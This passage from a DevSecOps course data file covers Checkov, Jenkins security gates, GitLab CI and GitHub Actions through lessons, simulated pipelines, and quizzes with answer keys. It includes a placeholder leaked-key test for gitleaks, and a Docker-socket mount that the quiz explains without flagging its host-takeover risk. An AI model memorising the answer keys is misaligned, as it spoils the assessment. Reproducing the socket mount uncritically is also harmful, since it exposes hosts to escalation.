        { cmd: 'checkov -d . --output json', desc: 'Generate JSON report.' },
      ],
    },
    verify: [
      'How many checks does Checkov fail on the insecure Terraform?',
      'Which CKV rule ID catches the public S3 bucket?',
    ],
    quiz: [
      { q: "What is Infrastructure as Code (IaC)?", opts: ["A type of programming language", "Defining cloud infrastructure in version-controlled configuration files", "A container orchestration tool", "A CI/CD platform"], answer: 1, explanation: "IaC means defining your infrastructure (servers, databases, networks) in files like Terraform, CloudFormation, or Kubernetes YAML, version-controlled like application code." },
      { q: "What is the #1 cause of cloud security breaches?", opts: ["Zero-day exploits", "Insider threats", "Misconfigurations (public buckets, open security groups, etc.)", "DDoS attacks"], answer: 2, explanation: "Misconfigurations are the leading cause of cloud breaches. Public S3 buckets, overly permissive security groups, and unencrypted databases are common culprits." },
      { q: "What does Checkov scan for?", opts: ["Application source code vulnerabilities", "Infrastructure misconfigurations against security best practices and compliance frameworks", "Network traffic anomalies", "Container runtime behavior"], answer: 1, explanation: "Checkov scans IaC files (Terraform, CloudFormation, K8s, etc.) against 1000+ security policies based on CIS Benchmarks and other compliance frameworks." },
      { q: "Why is 0.0.0.0/0 in a security group dangerous?", opts: ["It's an invalid IP", "It allows inbound traffic from ANY IP address on the internet", "It blocks all traffic", "It only allows local traffic"], answer: 1, explanation: "0.0.0.0/0 is a CIDR block that matches every IP address. In a security group ingress rule, it means the port is open to the entire internet." },
      { q: "Should you use multiple IaC scanning tools?", opts: ["No, one is enough", "Yes, different tools have different rule sets and catch different issues", "Only if required by compliance", "Only for production environments"], answer: 1, explanation: "Different IaC scanners (Checkov, KICS, tfsec) have different rule sets and detection methods. Using multiple tools provides better coverage of potential misconfigurations." },
    ],
  },
  '3.1': {
    id: '3.1', pathId: 3, title: 'Jenkins Pipeline Fundamentals', baseXP: 150, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Jenkins Architecture', blocks: [
          { type: 'text', content: 'Jenkins is the most popular open-source CI/CD server, powering millions of builds every day. It uses a controller-agent architecture where the controller schedules and orchestrates jobs while distributed agents execute them.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Developer', note: 'Pushes code' },
            { label: 'Jenkins Controller', note: 'Schedules jobs' },
            { label: 'Agent 1', note: 'Runs builds' },
            { label: 'Agent 2', note: 'Runs scans' },
            { label: 'Artifact Store', note: 'Stores results' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Plugin Ecosystem', content: 'Jenkins has 2,000+ plugins covering everything from Git integration to security scanning. This extensibility is its greatest strength — and its greatest maintenance challenge. Choose plugins carefully and keep them updated.' },
        ]},
        { heading: 'Jenkinsfile Structure', blocks: [
          { type: 'text', content: 'Jenkins pipelines are defined as code in a Jenkinsfile stored in your repository. There are two syntaxes, but Declarative Pipeline is strongly preferred for DevSecOps work.' },
          { type: 'comparison', items: [
            { title: 'Declarative Pipeline', color: '#22C55E', points: [
              'Structured format: pipeline{}, agent{}, stages{}, steps{}',
              'Easier to read and review in code reviews',
              'Built-in validation and error checking',
              'Recommended for DevSecOps pipelines',
            ]},
            { title: 'Scripted Pipeline', color: '#F59E0B', points: [
              'Full Groovy scripting language',
              'More flexible and powerful',
              'Harder to maintain and review',
              'Use only when declarative is insufficient',
            ]},
          ]},
          { type: 'scan-output', tool: 'Jenkinsfile', title: 'Declarative Pipeline Structure', findings: [
            { type: 'header', text: 'pipeline {' },
            { type: 'finding', text: '  agent any                    // Where to run', severity: 'info' },
            { type: 'finding', text: '  environment { ... }           // Variables & credentials', severity: 'info' },
            { type: 'finding', text: '  stages {                      // Ordered work units', severity: 'info' },
            { type: 'finding', text: '    stage("Build") { steps { ... } }', severity: 'info' },
            { type: 'finding', text: '    stage("Test")  { steps { ... } }', severity: 'info' },
            { type: 'finding', text: '    stage("Deploy"){ steps { ... } }', severity: 'info' },
            { type: 'finding', text: '  }', severity: 'info' },
            { type: 'finding', text: '  post { always { ... } failure { ... } }', severity: 'info' },
            { type: 'header', text: '}' },
          ]},
        ]},
        { heading: 'Key Concepts', blocks: [
          { type: 'keyterms', terms: [
            { term: 'Stages', definition: 'Logical groupings of work — Build, Test, Security, Deploy. Each stage appears as a column in the Jenkins pipeline view.' },
            { term: 'Steps', definition: 'Individual commands within stages — shell commands, plugin calls, or built-in Jenkins functions.' },
            { term: 'Post', definition: 'Actions that run after a stage or the entire pipeline completes. Conditions: always, success, failure, unstable, changed.' },
            { term: 'Environment', definition: 'Variables available to all stages. Defined at pipeline or stage level. Supports credentials() injection.' },
            { term: 'Agent', definition: 'Where the pipeline runs. "agent any" means any available executor. Can specify Docker images or labeled nodes.' },
          ]},
          { type: 'pipeline', stages: [
            { label: 'Checkout', icon: '📥', desc: 'Clone source code', security: false, tool: 'git' },
            { label: 'Build', icon: '🔨', desc: 'Compile & package', security: false, tool: 'docker' },
            { label: 'Test', icon: '🧪', desc: 'Run test suites', security: false, tool: 'pytest' },
            { label: 'Security', icon: '🔒', desc: 'Run security scans', security: true, tool: 'trivy' },
            { label: 'Deploy', icon: '🚀', desc: 'Ship to environment', security: false, tool: 'kubectl' },
          ]},
        ]},
        { heading: 'Credentials Management', blocks: [
          { type: 'callout', variant: 'warning', title: 'Never Hardcode Credentials', content: 'NEVER put passwords, API keys, or tokens directly in your Jenkinsfile. The file is stored in version control — anyone with repo access can see them. Leaked credentials are the #1 cause of security breaches.' },
          { type: 'steps', steps: [
            { label: 'Store in Jenkins Credentials Store', detail: 'Go to Jenkins > Manage Jenkins > Manage Credentials. Add your secret with a unique ID like "docker-registry-creds".' },
            { label: 'Reference with credentials() helper', detail: 'In your Jenkinsfile environment block: DOCKER_CREDS = credentials("docker-registry-creds"). Jenkins injects the value at runtime.' },
            { label: 'Use in pipeline steps', detail: 'Reference as ${DOCKER_CREDS} in shell commands. For username/password types, Jenkins creates _USR and _PSW suffix variables automatically.' },
          ]},
          { type: 'comparison', items: [
            { title: 'Supported Credential Types', color: '#3B82F6', points: [
              'Secret text — API keys, tokens',
              'Username/Password — registry logins',
              'SSH Key — Git clone, server access',
              'Certificate — TLS/SSL certificates',
            ]},
            { title: 'Best Practices', color: '#22C55E', points: [
              'Use unique IDs that describe the purpose',
              'Scope credentials to specific folders/jobs',
              'Rotate credentials on a regular schedule',
              'Audit credential usage in pipeline logs',
            ]},
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Build Your First Pipeline',
      scenario: "Understand Jenkins pipeline structure and write your first Jenkinsfile.",
      files: {
        'jenkins-lab/': {
          'Jenkinsfile': 'pipeline {\n    agent any\n    \n    environment {\n        APP_NAME = "secops-app"\n        DOCKER_REGISTRY = "registry.example.com"\n        DOCKER_CREDS = credentials("docker-registry-creds")\n    }\n    \n    stages {\n        stage("Checkout") {\n            steps {\n                git branch: "main", url: "https://github.com/org/app.git"\n            }\n        }\n        stage("Build") {\n            steps {\n                sh "docker build -t ${APP_NAME}:${BUILD_NUMBER} ."\n            }\n        }\n        stage("Test") {\n            steps {\n                sh "docker run --rm ${APP_NAME}:${BUILD_NUMBER} pytest"\n            }\n        }\n        stage("Deploy") {\n            when { branch "main" }\n            steps {\n                sh "docker push ${DOCKER_REGISTRY}/${APP_NAME}:${BUILD_NUMBER}"\n            }\n        }\n    }\n    post {\n        always { cleanWs() }\n        success { echo "Pipeline succeeded!" }\n        failure { echo "Pipeline failed!" }\n    }\n}',
          'docker-compose.yml': 'version: "3"\nservices:\n  jenkins:\n    image: jenkins/jenkins:lts\n    ports:\n      - "8080:8080"\n      - "50000:50000"\n    volumes:\n      - jenkins_data:/var/jenkins_home\n      - /var/run/docker.sock:/var/run/docker.sock\nvolumes:\n  jenkins_data:',
        },
      },
      steps: [
        { objective: 'Understand the pipeline structure', command: 'cat Jenkinsfile', output: '(Jenkinsfile displayed in file browser)', followUp: 'How many stages does this pipeline have?', answer: '4', hint: 'Count the stage() blocks: Checkout, Build, Test, Deploy' },
        { objective: 'Identify the agent configuration', command: 'grep "agent" Jenkinsfile', output: 'agent any', followUp: 'What does "agent any" mean?', answer: 'run on any available agent', hint: '"agent any" means the pipeline can run on any available Jenkins agent' },
        { objective: 'Find the credentials usage', command: 'grep "credentials" Jenkinsfile', output: 'DOCKER_CREDS = credentials("docker-registry-creds")', followUp: 'How are credentials injected — hardcoded or from Jenkins credentials store?', answer: 'credentials store', hint: 'The credentials() function retrieves secrets from Jenkins secure credentials store' },
        { objective: 'Understand the post block', command: 'grep -A5 "post" Jenkinsfile', output: 'post {\n    always { cleanWs() }\n    success { echo "Pipeline succeeded!" }\n    failure { echo "Pipeline failed!" }\n}', followUp: 'What does the "always" post condition do?', answer: 'cleanWs()', hint: 'The "always" block runs regardless of success or failure — here it cleans the workspace' },
        { objective: 'Understand conditional deployment', command: 'grep -B1 -A3 "when" Jenkinsfile', output: 'stage("Deploy") {\n    when { branch "main" }\n    steps {', followUp: 'On which branch does the Deploy stage run?', answer: 'main', hint: 'The "when { branch main }" directive limits this stage to the main branch only' },
      ],
    },
    execute: {
      intro: 'Set up Jenkins locally and create your first pipeline.',
      commands: [
        { cmd: 'docker run -d -p 8080:8080 -p 50000:50000 --name jenkins -v jenkins_data:/var/jenkins_home jenkins/jenkins:lts', desc: 'Start Jenkins in Docker.' },
        { cmd: 'docker exec jenkins cat /var/jenkins_home/secrets/initialAdminPassword', desc: 'Get initial admin password.' },
        { cmd: 'echo "Open http://localhost:8080 in browser, enter the password, install suggested plugins"', desc: 'Complete Jenkins setup wizard.' },
      ],
    },
    verify: [
      'What is the initial admin password for your Jenkins instance?',
      'How many suggested plugins does Jenkins want to install?',
    ],
    quiz: [
      { q: "What is the recommended Jenkinsfile format for DevSecOps?", opts: ["Scripted Pipeline", "Declarative Pipeline", "Freestyle Project", "Pipeline Script"], answer: 1, explanation: "Declarative Pipeline is preferred for DevSecOps because it's more readable, structured, and easier to maintain and review." },
      { q: "Where should credentials be stored in Jenkins?", opts: ["In the Jenkinsfile", "In environment variables on the server", "In Jenkins Credentials store using credentials() helper", "In a text file on the agent"], answer: 2, explanation: "Jenkins Credentials store securely encrypts and manages secrets. The credentials() helper injects them at runtime without exposing values in code." },
      { q: "What does the 'post' block in a Jenkinsfile do?", opts: ["Sends an email", "Defines actions that run after stages complete (on success, failure, or always)", "Deploys to production", "Posts to Slack"], answer: 1, explanation: "The post block defines actions for different pipeline outcomes: always (cleanup), success (notifications), failure (alerts), etc." },
      { q: "What does 'when { branch \"main\" }' do in a stage?", opts: ["Creates a new branch", "Only runs this stage when the pipeline is on the main branch", "Merges to main", "Deletes the branch"], answer: 1, explanation: "The 'when' directive conditionally executes a stage. 'branch main' means this stage only runs for the main branch." },
      { q: "Why mount Docker socket in Jenkins container?", opts: ["For logging", "So Jenkins can build and run Docker containers from inside its own container", "For networking", "It's required by Jenkins"], answer: 1, explanation: "Mounting /var/run/docker.sock gives the Jenkins container access to the host's Docker daemon, enabling Docker-in-Docker workflows for building images." },
    ],
  },
  '3.2': {
    id: '3.2', pathId: 3, title: 'Adding Security Gates to Jenkins', baseXP: 150, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'Security Gates', blocks: [
          { type: 'text', content: 'A security gate is a checkpoint in your pipeline that evaluates security scan results and makes a binary decision: pass or fail. Gates transform security scans from informational to actionable — the pipeline stops if quality standards are not met.' },
          { type: 'pipeline', stages: [
            { label: 'Secrets Scan', icon: '🔑', desc: 'Gitleaks detect', security: true, tool: 'gitleaks' },
            { label: 'SAST Gate', icon: '🔍', desc: 'Semgrep analysis', security: true, tool: 'semgrep' },
            { label: 'Build', icon: '🔨', desc: 'Docker build', security: false, tool: 'docker' },
            { label: 'Image Gate', icon: '🛡️', desc: 'Trivy scan', security: true, tool: 'trivy' },
            { label: 'Deploy', icon: '🚀', desc: 'If all gates pass', security: false, tool: 'kubectl' },
          ]},
          { type: 'callout', variant: 'key-concept', title: 'Gates vs Scans', content: 'A scan finds vulnerabilities. A gate decides what to do about them. Without gates, scans are just informational noise. Gates enforce your security policy automatically.' },
        ]},
        { heading: 'Hard Fail vs Soft Fail', blocks: [
          { type: 'comparison', items: [
            { title: 'Hard Fail', color: '#EF4444', points: [
              'Pipeline STOPS — build marked FAILED',
              'Use for CRITICAL and HIGH severity findings',
              'Blocks deployment until issues are fixed',
              'Example: --exit-code 1 flag in Trivy',
            ]},
            { title: 'Soft Fail', color: '#F59E0B', points: [
              'Warning logged — pipeline CONTINUES',
              'Use for MEDIUM/LOW findings',
              'Provides visibility without blocking delivery',
              'Example: allow_failure: true in GitLab CI',
            ]},
          ]},
          { type: 'scan-output', tool: 'quality-gate.sh', title: 'Quality Gate Script Output', findings: [
            { type: 'header', text: '=== Quality Gate Evaluation ===' },
            { type: 'finding', text: 'CRITICAL vulnerabilities: 0', severity: 'low' },
            { type: 'finding', text: 'HIGH vulnerabilities: 3', severity: 'medium' },
            { type: 'finding', text: 'MEDIUM vulnerabilities: 12', severity: 'low' },
            { type: 'summary', text: 'PASSED — No critical findings. HIGH count (3) within threshold (5).' },
          ]},
        ]},
        { heading: 'Quality Gate Design', blocks: [
          { type: 'text', content: 'The golden rule: start permissive, tighten over time. Blocking everything on day one creates developer frustration and resistance. Gradual rollout builds trust and adoption.' },
          { type: 'steps', steps: [
            { label: 'Month 1 — Observe', detail: 'Log everything, fail on nothing. Run all scans but only record results. Establish a baseline of your current vulnerability count.' },
            { label: 'Month 2 — Gate Critical', detail: 'Hard fail on CRITICAL findings only. These are the must-fix issues (RCE, SQL injection, leaked secrets). Teams can handle this low volume.' },
            { label: 'Month 3 — Gate High', detail: 'Hard fail on CRITICAL + HIGH. Soft fail (warning) on MEDIUM. By now teams understand the tools and have fixed their backlog.' },
            { label: 'Month 4+ — Full Policy', detail: 'Custom thresholds per team/repo. SLA-based gates (e.g., fix HIGH within 7 days). Exception workflows for false positives.' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Track the number of pipeline blocks per week. If it spikes after tightening a gate, consider rolling back one level. The goal is sustained improvement, not developer rebellion.' },
        ]},
        { heading: 'Maturity Model', blocks: [
          { type: 'text', content: 'Organizations progress through five levels of DevSecOps pipeline maturity. Most teams start at Level 1 and should aim to reach Level 4 within 6-12 months.' },
          { type: 'severity-bars', title: 'DevSecOps Pipeline Maturity Levels', items: [
            { rank: 1, label: 'Level 1: Manual Reviews', count: 20, color: '#EF4444' },
            { rank: 2, label: 'Level 2: Scans + Logging', count: 40, color: '#F59E0B' },
            { rank: 3, label: 'Level 3: Soft Gates (Warnings)', count: 60, color: '#F97316' },
            { rank: 4, label: 'Level 4: Hard Gates (Critical/High)', count: 80, color: '#3B82F6' },
            { rank: 5, label: 'Level 5: Custom Policies + SLAs', count: 100, color: '#22C55E' },
          ]},
          { type: 'attack-flow', steps: [
            { type: 'info', label: 'Level 1', detail: 'Security team manually reviews code before release. Slow and inconsistent.' },
            { type: 'info', label: 'Level 2', detail: 'Automated scans run in CI. Results are logged and visible but do not block.' },
            { type: 'defense', label: 'Level 3', detail: 'Soft gates produce warnings on findings. Developers see issues without being blocked.' },
            { type: 'defense', label: 'Level 4', detail: 'Hard gates block deployment for Critical/High. Most teams should target this level.' },
            { type: 'defense', label: 'Level 5', detail: 'Custom policies, SLA-based remediation windows, automated exception workflows.' },
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'Secure the Pipeline',
      scenario: "You have a basic Jenkins pipeline. Add security scanning stages and quality gates.",
      files: {
        'pipeline/': {
          'Jenkinsfile': 'pipeline {\n    agent any\n    environment {\n        APP = "webapp"\n    }\n    stages {\n        stage("Checkout") { steps { git "https://github.com/org/webapp" } }\n        stage("Secrets Scan") {\n            steps {\n                sh "gitleaks detect --report-format json --report-path gitleaks-report.json"\n            }\n            post {\n                always { archiveArtifacts artifacts: "gitleaks-report.json", allowEmptyArchive: true }\n            }\n        }\n        stage("SAST") {\n            steps {\n                sh "semgrep scan --config auto --json -o semgrep-report.json"\n            }\n        }\n        stage("Build Image") {\n            steps {\n                sh "docker build -t ${APP}:${BUILD_NUMBER} ."\n            }\n        }\n        stage("Image Scan") {\n            steps {\n                sh "trivy image --severity HIGH,CRITICAL --exit-code 1 ${APP}:${BUILD_NUMBER}"\n            }\n        }\n        stage("Deploy") {\n            when { branch "main" }\n            steps {\n                sh "echo Deploying..."\n            }\n        }\n    }\n    post {\n        failure { sh "echo \'Security gate failed! Check reports.\'" }\n    }\n}',
          'quality-gate.sh': '#!/bin/bash\n# Quality gate script\nCRITICAL_COUNT=$(cat report.json | jq \'[.[] | select(.severity == "CRITICAL")] | length\')\nHIGH_COUNT=$(cat report.json | jq \'[.[] | select(.severity == "HIGH")] | length\')\n\necho "CRITICAL: $CRITICAL_COUNT, HIGH: $HIGH_COUNT"\n\nif [ "$CRITICAL_COUNT" -gt 0 ]; then\n  echo "FAILED: Critical vulnerabilities found"\n  exit 1\nfi\n\nif [ "$HIGH_COUNT" -gt 5 ]; then\n  echo "FAILED: Too many HIGH vulnerabilities ($HIGH_COUNT > 5)"\n  exit 1\nfi\n\necho "PASSED: Quality gate OK"\nexit 0',
        },
      },
      steps: [
        { objective: 'Review the secured pipeline', command: 'cat Jenkinsfile', output: '(Pipeline displayed)', followUp: 'How many security scanning stages were added?', answer: '3', hint: 'Count: Secrets Scan, SAST, Image Scan = 3 security stages' },
        { objective: 'Understand the Trivy exit code gate', command: 'grep "exit-code" Jenkinsfile', output: 'sh "trivy image --severity HIGH,CRITICAL --exit-code 1 ${APP}:${BUILD_NUMBER}"', followUp: 'What does --exit-code 1 do?', answer: 'fails the pipeline if vulnerabilities are found', hint: '--exit-code 1 makes Trivy return exit code 1 (failure) if any matching vulnerabilities are found' },
        { objective: 'Review the quality gate script', command: 'cat quality-gate.sh', output: '(Script displayed)', followUp: 'At what number of HIGH vulns does the gate fail?', answer: '5', hint: 'Look at the condition: HIGH_COUNT -gt 5' },
        { objective: 'Understand artifact archiving', command: 'grep "archiveArtifacts" Jenkinsfile', output: 'archiveArtifacts artifacts: "gitleaks-report.json", allowEmptyArchive: true', followUp: 'Why archive scan reports?', answer: 'for review and audit trail', hint: 'Archived artifacts persist after the build, allowing security teams to review findings' },
        { objective: 'Test the pipeline with a secret', command: 'echo "AWS_KEY=AKIA..." > test.py && gitleaks detect -v', output: '1 leak found!\n\nFinding: AKIA...\nRuleID: aws-access-key-id\nFile: test.py', followUp: 'Does the pipeline fail when a secret is committed?', answer: 'yes', hint: 'Gitleaks returns non-zero exit code when secrets are found, failing the pipeline stage' },
      ],
    },
    execute: {
      intro: 'Add security scanning stages to a Jenkins pipeline.',
      commands: [
        { cmd: 'echo "Create a Jenkinsfile with the security stages shown in the simulation"', desc: 'Write the enhanced Jenkinsfile.' },
        { cmd: 'echo "Configure Jenkins to use the Jenkinsfile from your repo"', desc: 'Point Jenkins at your repo.' },
        { cmd: 'echo "Trigger a build and observe security scan stages"', desc: 'Run the pipeline.' },
      ],
    },
    verify: [
      'Does your pipeline fail when you commit a secret? (yes/no)',
      'How many security stages does your pipeline have?',
    ],
    quiz: [
      { q: "What is a security quality gate?", opts: ["A firewall rule", "A checkpoint that evaluates scan results and passes or fails the pipeline", "An authentication system", "A manual code review"], answer: 1, explanation: "A quality gate is an automated checkpoint that evaluates security scan results against defined thresholds and blocks the pipeline if standards aren't met." },
      { q: "When rolling out security gates, what's the recommended approach?", opts: ["Block everything immediately", "Start with logging only, then gradually add soft gates, then hard gates", "Only add gates before releases", "Let developers decide"], answer: 1, explanation: "Gradual rollout prevents developer frustration. Start permissive (log only), add soft gates (warnings), then hard gates (blocks) as teams adapt." },
      { q: "What does --exit-code 1 do in Trivy?", opts: ["Limits output to 1 line", "Returns exit code 1 (failure) if vulnerabilities matching criteria are found", "Only shows 1 vulnerability", "Exits after 1 second"], answer: 1, explanation: "--exit-code 1 makes Trivy return a non-zero exit code when vulnerabilities are found, which causes the Jenkins stage to fail." },
      { q: "Why archive security scan reports as build artifacts?", opts: ["To share on social media", "For audit trail, review, and tracking trends over time", "They're required by Docker", "To save disk space"], answer: 1, explanation: "Archived reports provide an audit trail, allow security team review, and enable tracking vulnerability trends across builds." },
      { q: "What's the difference between a hard fail and a soft fail?", opts: ["Hard fails are louder", "Hard fail stops the pipeline; soft fail logs a warning but allows continuation", "Soft fails are for production only", "They're the same thing"], answer: 1, explanation: "Hard fails block the pipeline (build fails). Soft fails log warnings but allow the pipeline to continue. Use soft fails during initial adoption." },
    ],
  },
  '3.3': {
    id: '3.3', pathId: 3, title: 'GitLab CI/CD', baseXP: 150, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'GitLab CI Architecture', blocks: [
          { type: 'text', content: 'GitLab CI is built directly into GitLab — no separate CI server to install or maintain. Pipelines are defined in a .gitlab-ci.yml file at the repository root and executed by GitLab Runners.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Developer', note: 'Pushes code' },
            { label: 'GitLab Server', note: 'Parses .gitlab-ci.yml' },
            { label: 'Runner (Shared)', note: 'GitLab-managed' },
            { label: 'Runner (Self-hosted)', note: 'Your servers' },
            { label: 'Artifacts', note: 'Reports & builds' },
          ]},
          { type: 'comparison', items: [
            { title: 'Shared Runners', color: '#3B82F6', points: [
              'Managed by GitLab (gitlab.com)',
              'No infrastructure to maintain',
              'Limited compute minutes on free tier',
              'Good for small-to-medium projects',
            ]},
            { title: 'Self-hosted Runners', color: '#A78BFA', points: [
              'Installed on your own servers',
              'Full control over environment and resources',
              'No compute minute limits',
              'Required for air-gapped or compliance environments',
            ]},
          ]},
        ]},
        { heading: '.gitlab-ci.yml Structure', blocks: [
          { type: 'text', content: 'The .gitlab-ci.yml file defines stages (an ordered list), then jobs that belong to those stages. Jobs in the same stage run in parallel by default, giving you fast feedback.' },
          { type: 'scan-output', tool: '.gitlab-ci.yml', title: 'GitLab CI YAML Structure', findings: [
            { type: 'header', text: 'stages:' },
            { type: 'finding', text: '  - build', severity: 'info' },
            { type: 'finding', text: '  - test', severity: 'info' },
            { type: 'finding', text: '  - security        # Security scans run here', severity: 'medium' },
            { type: 'finding', text: '  - deploy', severity: 'info' },
            { type: 'header', text: 'job_name:' },
            { type: 'finding', text: '  stage: security   # Which stage this job belongs to', severity: 'info' },
            { type: 'finding', text: '  image: tool:latest # Docker image for the job', severity: 'info' },
            { type: 'finding', text: '  script:           # Commands to execute', severity: 'info' },
            { type: 'finding', text: '  artifacts:        # Files to save after job', severity: 'info' },
            { type: 'finding', text: '  rules:            # When to run this job', severity: 'info' },
          ]},
          { type: 'callout', variant: 'tip', content: 'Jobs in the same stage run in parallel. Place SAST, secrets scanning, and SCA in the same "security" stage to scan simultaneously and save pipeline time.' },
        ]},
        { heading: 'Built-in Security', blocks: [
          { type: 'text', content: 'GitLab provides built-in security scanning templates that require just a single include line. Results automatically appear in the Merge Request security widget for inline review.' },
          { type: 'pipeline', stages: [
            { label: 'SAST', icon: '🔍', desc: 'Source code analysis', security: true, tool: 'semgrep' },
            { label: 'DAST', icon: '🌐', desc: 'Dynamic app testing', security: true, tool: 'ZAP' },
            { label: 'SCA', icon: '📦', desc: 'Dependency scanning', security: true, tool: 'gemnasium' },
            { label: 'Container', icon: '🐳', desc: 'Image scanning', security: true, tool: 'trivy' },
            { label: 'Secrets', icon: '🔑', desc: 'Secret detection', security: true, tool: 'gitleaks' },
            { label: 'License', icon: '📜', desc: 'Compliance check', security: true, tool: 'license-finder' },
          ]},
          { type: 'callout', variant: 'example', title: 'Including a Security Template', content: 'Add this to your .gitlab-ci.yml to enable SAST scanning:\n\ninclude:\n  - template: Security/SAST.gitlab-ci.yml\n\nThat\'s it. GitLab automatically adds a SAST job, runs it, and displays findings in the Merge Request widget.' },
        ]},
        { heading: 'Key Directives', blocks: [
          { type: 'keyterms', terms: [
            { term: 'artifacts:reports:sast', definition: 'Uploads SAST results to the GitLab MR security widget for inline display of findings on affected lines.' },
            { term: 'allow_failure: true', definition: 'Converts a job failure into a warning. The pipeline continues, but the failure is visible in the UI. Acts as a soft gate.' },
            { term: 'when: manual', definition: 'Requires a human to click a button in the GitLab UI to trigger the job. Adds an approval step before deployment.' },
            { term: 'needs: [job]', definition: 'Creates a dependency between jobs. This job waits for the specified job to complete, even across stages.' },
            { term: 'rules:', definition: 'Conditional execution logic. Controls when a job runs based on branch, variables, file changes, or other conditions.' },
          ]},
          { type: 'comparison', items: [
            { title: 'GitLab CI', color: '#F97316', points: [
              'Built into GitLab — zero setup',
              'YAML-based pipeline config',
              'Built-in security templates',
              'MR security widget shows findings inline',
              'Auto DevOps for zero-config pipelines',
            ]},
            { title: 'Jenkins', color: '#3B82F6', points: [
              'Separate server to install and maintain',
              'Groovy-based Jenkinsfile',
              'Security via plugins (more flexible)',
              'Blue Ocean UI for pipeline visualization',
              '2,000+ plugins for any integration',
            ]},
          ]},
        ]},
      ],
    },
    simulation: {
      title: 'GitLab Security Pipeline',
      scenario: "Write a .gitlab-ci.yml with security scanning stages.",
      files: {
        'gitlab-lab/': {
          '.gitlab-ci.yml': 'stages:\n  - build\n  - test\n  - security\n  - deploy\n\nvariables:\n  DOCKER_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA\n\nbuild:\n  stage: build\n  image: docker:24\n  services:\n    - docker:24-dind\n  script:\n    - docker build -t $DOCKER_IMAGE .\n    - docker push $DOCKER_IMAGE\n\nsast:\n  stage: security\n  image: semgrep/semgrep:latest\n  script:\n    - semgrep scan --config auto --json -o gl-sast-report.json\n  artifacts:\n    reports:\n      sast: gl-sast-report.json\n  allow_failure: true\n\nsecrets:\n  stage: security\n  image: zricethezav/gitleaks:latest\n  script:\n    - gitleaks detect -v --report-format json --report-path gl-secrets-report.json\n  artifacts:\n    paths:\n      - gl-secrets-report.json\n\ncontainer_scan:\n  stage: security\n  image: aquasec/trivy:latest\n  script:\n    - trivy image --severity HIGH,CRITICAL --exit-code 1 $DOCKER_IMAGE\n\ndeploy_staging:\n  stage: deploy\n  script:\n    - echo "Deploying to staging..."\n  environment:\n    name: staging\n  rules:\n    - if: $CI_COMMIT_BRANCH == "main"\n      when: manual',
        },
      },
      steps: [
        { objective: 'Understand the stage order', command: 'grep "stages:" -A4 .gitlab-ci.yml', output: 'stages:\n  - build\n  - test\n  - security\n  - deploy', followUp: 'In what order do stages execute?', answer: 'build, test, security, deploy', hint: 'Stages execute in the order listed' },
        { objective: 'Find the SAST job configuration', command: 'grep -A8 "^sast:" .gitlab-ci.yml', output: 'sast:\n  stage: security\n  image: semgrep/semgrep:latest\n  script:\n    - semgrep scan --config auto --json -o gl-sast-report.json\n  artifacts:\n    reports:\n      sast: gl-sast-report.json\n  allow_failure: true', followUp: 'What does allow_failure: true mean?', answer: 'the pipeline continues even if this job fails', hint: 'allow_failure: true means a job failure becomes a warning, not a pipeline failure' },
        { objective: 'Understand artifacts:reports:sast', command: 'grep "reports:" -A1 .gitlab-ci.yml', output: '    reports:\n      sast: gl-sast-report.json', followUp: 'Where do SAST reports appear in GitLab?', answer: 'merge request security widget', hint: 'artifacts:reports:sast uploads findings to the GitLab MR security widget automatically' },
        { objective: 'Check the deployment rules', command: 'grep -A4 "rules:" .gitlab-ci.yml', output: '  rules:\n    - if: $CI_COMMIT_BRANCH == "main"\n      when: manual', followUp: 'Is deployment automatic or manual?', answer: 'manual', hint: 'when: manual means someone must click a button to trigger deployment' },
      ],
    },
    execute: { intro: 'Study the .gitlab-ci.yml structure.', commands: [{ cmd: 'echo "Review the pipeline YAML"', desc: 'Understanding GitLab CI YAML is the key skill here.' }] },
    verify: ['What directive makes a GitLab CI job a soft gate?', 'What section uploads SAST results to the MR widget?'],
    quiz: [
      { q: "How is GitLab CI different from Jenkins?", opts: ["It's slower", "It's built into GitLab — no separate server, YAML config, built-in security templates", "It doesn't support Docker", "It's only for Ruby projects"], answer: 1, explanation: "GitLab CI is integrated into the GitLab platform, uses YAML configuration, and includes built-in security scanning templates." },
      { q: "What does 'allow_failure: true' do?", opts: ["Retries the job", "Marks the job as a warning if it fails, but the pipeline continues", "Deletes the job", "Skips the job entirely"], answer: 1, explanation: "allow_failure: true converts a job failure into a warning. The pipeline continues, but the failure is visible in the UI." },
      { q: "What is artifacts:reports:sast used for?", opts: ["Storing build output", "Uploading SAST results to GitLab's MR security widget for inline display", "Sending email reports", "Backing up code"], answer: 1, explanation: "artifacts:reports:sast tells GitLab to parse the SAST report file and display findings in the Merge Request security widget." },
      { q: "What does 'when: manual' mean for a deploy job?", opts: ["It runs automatically", "A human must click a button in GitLab UI to trigger the job", "It runs at midnight", "It requires SSH access"], answer: 1, explanation: "'when: manual' requires someone to manually trigger the job through the GitLab UI — adding a human approval step before deployment." },
      { q: "How do GitLab CI jobs in the same stage relate?", opts: ["They run sequentially", "They run in parallel by default", "Only one runs based on conditions", "They share memory"], answer: 1, explanation: "Jobs in the same stage run in parallel by default. This means your SAST and secrets scanning can run simultaneously in the 'security' stage." },
    ],
  },
  '3.4': {
    id: '3.4', pathId: 3, title: 'GitHub Actions', baseXP: 150, estTime: '20-35 min',
    hasSim: true, hasExecute: true, hasVerify: true,
    theory: {
      sections: [
        { heading: 'GitHub Actions Concepts', blocks: [
          { type: 'text', content: 'GitHub Actions is GitHub\'s built-in CI/CD platform. Workflows are YAML files stored in .github/workflows/ and triggered by repository events like pushes, pull requests, or schedules.' },
          { type: 'diagram', variant: 'linear', nodes: [
            { label: 'Event', note: 'push / PR / schedule' },
            { label: 'Workflow', note: '.github/workflows/*.yml' },
            { label: 'Job', note: 'runs-on: ubuntu-latest' },
            { label: 'Steps', note: 'uses: or run:' },
            { label: 'Artifacts', note: 'Reports & outputs' },
          ]},
          { type: 'keyterms', terms: [
